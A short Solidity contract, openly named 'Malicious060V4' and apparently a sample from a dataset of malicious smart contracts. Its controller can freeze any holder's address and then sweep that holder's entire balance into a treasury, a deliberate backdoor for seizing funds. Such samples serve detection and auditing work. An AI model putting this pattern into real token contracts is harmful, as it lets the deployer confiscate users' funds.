// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Malicious060V4 {
    address public controller;
    address public treasury;
    mapping(address => bool) public frozen;
    mapping(address => uint256) public balanceOf;
    constructor(address t, uint256 supply) {
        controller = msg.sender;
        treasury = t;
        balanceOf[msg.sender] = supply;
    }
    modifier onlyController() { require(msg.sender == controller, "controller"); _; }

    function setFrozen(address user, bool value) external onlyController { frozen[user] = value; }

    function recoverFrozen(address user) external onlyController {
        require(frozen[user], "not frozen");
        uint256 amount = balanceOf[user];
        balanceOf[user] = 0;
        balanceOf[treasury] += amount;
    }
}
